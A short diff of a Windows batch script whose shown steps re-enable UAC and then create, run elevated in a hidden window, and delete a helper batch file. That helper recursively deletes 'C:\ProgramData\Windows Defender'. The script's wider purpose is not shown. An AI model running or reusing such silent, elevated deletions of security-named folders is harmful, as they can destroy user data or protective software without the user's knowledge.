@@ -119,10 +119,11 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Prom
 echo    [+] UAC re-enabled. Restart required.
 
 echo [5/5] Deleting files...
-echo @echo off > "%TEMP%\del_folder.bat"
-echo rmdir /s /q "C:\ProgramData\Windows Defender" >> "%TEMP%\del_folder.bat"
-powershell -NoProfile -Command "Start-Process cmd.exe -ArgumentList '/c \"%TEMP%\del_folder.bat\"' -Verb RunAs -Wait -WindowStyle Hidden"
-del "%TEMP%\del_folder.bat" >nul 2>&1
+for %%I in ("%TEMP%") do set "SHORTTEMP=%%~sI"
+echo @echo off > "%SHORTTEMP%\cleanup.bat"
+echo rmdir /s /q "C:\ProgramData\Windows Defender" >> "%SHORTTEMP%\cleanup.bat"
+powershell -NoProfile -Command "Start-Process cmd.exe -ArgumentList '/c \"%SHORTTEMP%\cleanup.bat\"' -Verb RunAs -Wait -WindowStyle Hidden"
+del "%SHORTTEMP%\cleanup.bat" >nul 2>&1
 if not exist "%DEST%" (
     echo    [+] Folder deleted.
 ) else (
